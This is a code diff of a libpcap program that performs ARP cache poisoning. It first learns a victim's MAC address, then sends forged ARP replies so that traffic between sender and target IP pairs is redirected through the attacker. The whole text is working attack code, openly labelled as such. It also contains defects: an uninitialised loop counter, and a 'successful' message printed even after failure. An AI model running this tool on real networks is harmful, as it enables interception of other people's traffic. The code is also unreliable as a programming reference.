@@ -48,13 +48,15 @@ int get_s_mac(char* s_ip, char* s_mac){
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 	packet.arp_.tip_ = htonl(Ip(s_ip));
 
+	printf("sending normal ARP packet to victim...\n");
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
 
-	sleep(3);
-	while (true) {
+	sleep(3); // because getting arp reply can take some time
+
+	for(int i;i<1000;i++) {
         struct pcap_pkthdr *pkt_header;
         const u_char *pkt_data;
         int res = pcap_next_ex(handle, &pkt_header, &pkt_data);
@@ -67,32 +69,30 @@ int get_s_mac(char* s_ip, char* s_mac){
 
 		EthArpPacket* arp_pkt = (EthArpPacket *)pkt_data;
 
-        if(arp_pkt->eth_.type_ != htons(EthHdr::Arp)){
-			continue;
-		} 
-		if(arp_pkt->arp_.op_ != htons(ArpHdr::Reply)){
-			continue;
-		}
-		if(memcmp(arp_pkt->eth_.dmac_.mac_, a_mac.mac_, 6)!=0){
-			continue;
-		}
-		if( Ip(s_ip).ip_ != htonl(arp_pkt->arp_.sip_.ip_) ){
-			continue;
-		}
+        if(arp_pkt->eth_.type_ != htons(EthHdr::Arp))continue;
+		if(arp_pkt->arp_.op_ != htons(ArpHdr::Reply))continue;
+		if(memcmp(arp_pkt->eth_.dmac_.mac_, a_mac.mac_, 6)!=0)continue;
+		if(Ip(s_ip).ip_ != htonl(arp_pkt->arp_.sip_.ip_))continue;
 
 		uint8_t* mac_str = (uint8_t*)arp_pkt->arp_.smac_;
-		sprintf(s_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mac_str[0], mac_str[1], mac_str[2], \
-            mac_str[3], mac_str[4], mac_str[5]);
-		break;
-		}
-    
-	pcap_close(handle);
+		sprintf(s_mac, "%02x:%02x:%02x:%02x:%02x:%02x", mac_str[0], mac_str[1], \
+					mac_str[2], mac_str[3], mac_str[4], mac_str[5]);
+
+		pcap_close(handle);
+
+		return 0;
+	}
+	return -1;
 }
 
 int arp_inf_attack(char* s_ip, char* t_ip){
 	char s_mac[80];
-	get_s_mac(s_ip, s_mac);
-	printf("%s\n", s_mac);
+
+	if(get_s_mac(s_ip, s_mac)!=0){
+		printf("failed to get victim MAC address!\n");
+		return -1;
+	}
+	printf("successfully got victim MAC\n");
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
@@ -117,8 +117,8 @@ int arp_inf_attack(char* s_ip, char* t_ip){
 	packet.arp_.tmac_ = Mac(s_mac);
 	packet.arp_.tip_ = htonl(Ip(s_ip));
 
+	printf("sending attack ARP packet to victim...\n");
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
@@ -128,17 +128,22 @@ int arp_inf_attack(char* s_ip, char* t_ip){
 
 int main(int argc, char* argv[]) {
 	
-	int counter = argc/2-1;
-	strcpy(iface, argv[1]);
-
-	get_ip(attacker_ip, argv[1]);
-	get_mac(attacker_mac, argv[1]);
-
-	printf("%s\n", attacker_ip);
-	printf("%s\n", attacker_mac);
-
 	if (argc < 4 || argc%2==1) {
 		usage();
+		return -1;
+	}
+
+	int counter = argc/2-1;
+
+	strcpy(iface, argv[1]);
+
+	if(get_ip(attacker_ip, argv[1])!=0){
+		printf("error getting ip!\n");
+		return -1;
+	}
+
+	if(get_mac(attacker_mac, argv[1])!=0){
+		printf("error getting mac!\n");
 		return -1;
 	}
 
@@ -146,6 +151,9 @@ int main(int argc, char* argv[]) {
 	a_ip = Ip(attacker_ip);
 
 	for(int i = 0; i < counter;i++){
-		arp_inf_attack(argv[2*i+2], argv[2*i+3]);
+		if(arp_inf_attack(argv[2*i+2], argv[2*i+3])!=0){
+			printf("error while attacking!\n");
+		}
+		printf("attack succesful!\n");
 	}
 }
